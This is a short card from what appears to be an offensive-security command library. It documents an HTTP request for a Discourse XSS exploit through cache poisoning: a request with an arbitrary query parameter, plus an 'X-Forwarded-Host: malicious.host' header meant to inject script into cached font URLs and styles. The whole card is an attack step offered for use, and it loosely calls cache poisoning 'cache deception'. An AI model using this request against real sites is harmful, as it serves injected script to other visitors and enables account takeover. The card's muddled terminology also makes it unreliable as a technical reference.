---
data: GET /?xx HTTP/1.1
tags:
  - http
  - cache-deception
type: command
executor: bash
platforms:
  - Web
id: f73e2cad-5f51-4082-87ce-072990dab95c
created_at: '2025-12-13T09:00:34.546Z'
updated_at: '2025-12-13T09:00:34.546Z'
verified: false
validated: true
submitted: true
---
# GET Request with Cache Deception

## Command

```bash
GET /?xx HTTP/1.1
```

## Description

Sends an HTTP GET request to demonstrate the vulnerable endpoint and inject payload via headers, appending arbitrary parameter for cache deception in Discourse XSS exploits.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `?xx` | Appends arbitrary parameter to URL for cache deception | Yes |

## Examples

### Basic Usage

```bash
GET /?xx HTTP/1.1
```

### Advanced Usage

```bash
GET /?cacheattack HTTP/1.1
X-Forwarded-Host: malicious.host
```

## Expected Output

HTTP response with injected XSS in font URLs and styles.

## Related

- [[commands/inject-xss-via-cache-poisoning-script]]
- [[procedures/Access-Poisoned-Cache-URL]]
